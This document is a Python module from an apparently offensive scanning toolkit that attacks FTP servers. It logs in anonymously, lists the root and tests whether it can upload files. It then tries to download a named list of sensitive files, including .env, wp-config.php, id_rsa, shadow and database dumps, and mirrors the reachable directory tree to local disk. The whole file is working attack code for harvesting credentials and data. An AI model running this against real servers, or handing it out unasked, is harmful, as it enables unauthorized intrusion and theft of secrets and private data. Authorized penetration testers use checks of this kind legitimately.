"""
FTP Anonymous Login + Weak Config Check.
Tries anonymous access, lists root, checks writable dirs,
and downloads everything it can read to downloads/<host>/ftp/.
"""
import ftplib
import io
import os

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.downloads import save_bytes


INTERESTING_FILES = [
    ".htpasswd", ".htaccess", "wp-config.php", "config.php", ".env",
    "config.inc.php", "settings.php", "id_rsa", "id_dsa",
    "authorized_keys", "passwd", "shadow", "backup.zip", "backup.tar.gz",
    "db.sql", "dump.sql", "site.zip", "web.zip",
]


def _recursive_download(ftp, host, subdir, depth=2):
    """List and download everything reachable (bounded depth)."""
    if depth <= 0:
        return
    try:
        entries = []
        ftp.retrlines("LIST", entries.append)
    except Exception:
        return

    for line in entries:
        parts = line.split()
        if len(parts) < 9:
            continue
        name = " ".join(parts[8:])
        if name in (".", ".."):
            continue
        is_dir = line.startswith("d")
        is_link = line.startswith("l")
        if is_dir:
            try:
                ftp.cwd(name)
                _recursive_download(ftp, host, os.path.join(subdir, name), depth - 1)
                ftp.cwd("..")
            except Exception:
                continue
        elif not is_link:
            try:
                buf = io.BytesIO()
                ftp.retrbinary(f"RETR {name}", buf.write)
                save_bytes(buf.getvalue(), name, host=host, subdir=subdir)
            except Exception:
                pass


def run(target: TargetInfo, config: AttackConfig) -> None:
    console.print(
        f"\n[bold primary][ FTP ANONYMOUS / WEAK CONFIG ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
    )

    ftp = ftplib.FTP()
    try:
        ftp.connect(target.host, target.port, timeout=8)
        ftp.login("anonymous", "test@test.com")
        console.print("  [success]✓ Anonymous login ALLOWED[/success]")
    except ftplib.error_perm as e:
        console.print(f"  [muted]Anonymous login denied: {e}[/muted]")
        try: ftp.close()
        except Exception: pass
        return
    except Exception as e:
        console.print(f"[error]  Connection failed: {e}[/error]")
        return

    # Root listing
    try:
        entries = []
        ftp.retrlines("LIST", entries.append)
        console.print(f"  [muted]Root listing ({len(entries)} entries):[/muted]")
        for e in entries[:20]:
            console.print(f"    [text]{e}[/text]")
    except Exception as e:
        console.print(f"  [warning]LIST failed: {e}[/warning]")

    # Write test
    try:
        ftp.storbinary("STOR .bruter_test", io.BytesIO(b"test\n"))
        console.print("  [bold warning]⚠ Writable root — can upload files[/bold warning]")
        try: ftp.delete(".bruter_test")
        except Exception: pass
    except Exception:
        console.print("  [muted]Root not writable.[/muted]")

    # Download interesting files
    console.print("\n[bold secondary]▸ Downloading interesting files[/bold secondary]")
    for f in INTERESTING_FILES:
        try:
            buf = io.BytesIO()
            ftp.retrbinary(f"RETR {f}", buf.write)
            save_bytes(buf.getvalue(), f, host=target.host, subdir="ftp")
        except Exception:
            pass

    # Recursive mirror
    console.print("\n[bold secondary]▸ Mirroring reachable tree (depth 2)[/bold secondary]")
    try:
        ftp.cwd("/")
        _recursive_download(ftp, target.host, "ftp_mirror", depth=2)
    except Exception as e:
        console.print(f"  [warning]Mirror failed: {e}[/warning]")

    try: ftp.quit()
    except Exception: ftp.close()

    if config.log_file:
        try:
            with open(config.log_file, "a", encoding="utf-8") as fh:
                fh.write(
                    f"[FTP-ANON] {target.host}:{target.port} anonymous ALLOWED\n"
                )
        except OSError:
            pass